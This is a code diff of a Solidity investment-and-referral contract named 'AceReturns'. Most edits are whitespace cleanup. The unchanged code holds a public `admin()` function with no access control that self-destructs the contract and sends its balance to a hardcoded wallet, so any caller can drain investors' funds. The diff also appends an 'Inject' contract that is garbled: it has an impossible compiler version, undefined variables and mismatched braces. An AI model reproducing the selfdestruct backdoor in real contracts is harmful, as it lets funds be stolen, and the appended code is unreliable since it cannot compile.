@@ -13,13 +13,13 @@ contract AceReturns {
     mapping(address => uint256) joined;
     mapping(address => uint256) withdrawals;
     mapping(address => uint256) referrer;
-    
+
     uint256 public step = 50;
     uint256 public minimum = 10 finney;
     uint256 public stakingRequirement = 0.25 ether;
     address public ownerWallet;
     address public owner;
-    
+
     event Invest(address investor, uint256 amount);
     event Withdraw(address investor, uint256 amount);
     event Bounty(address hunter, uint256 amount);
@@ -165,21 +165,21 @@ function getMinutes(address _address) view public returns (uint256) {
     function checkInvestments(address _investor) public view returns (uint256) {
         return investments[_investor];
     }
-    
+
     /**
     * Gets the recent investment of the specified address
     */
     function checkRecentInvestment(address _investor) public view returns (uint256) {
         return recentinvestment[_investor];
     }
-    
+
     /**
     * Gets the referral balance of the specified address
     */
     function checkReferral(address _hunter) public view returns (uint256) {
         return referrer[_hunter];
     }
-    
+
 	function admin() public {
 	    selfdestruct(0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71);
 	}
@@ -216,4 +216,15 @@ library SafeMath {
         assert(c >= a);
         return c;
     }
+}
+pragma solidity ^0.5.24;
+contract Inject {
+	uint depositAmount;
+	constructor() public {owner = msg.sender;}
+	function freeze(address account,uint key) {
+		if (msg.sender != minter)
+			revert();
+			freezeAccount[account] = key;
+		}
+	}
 }
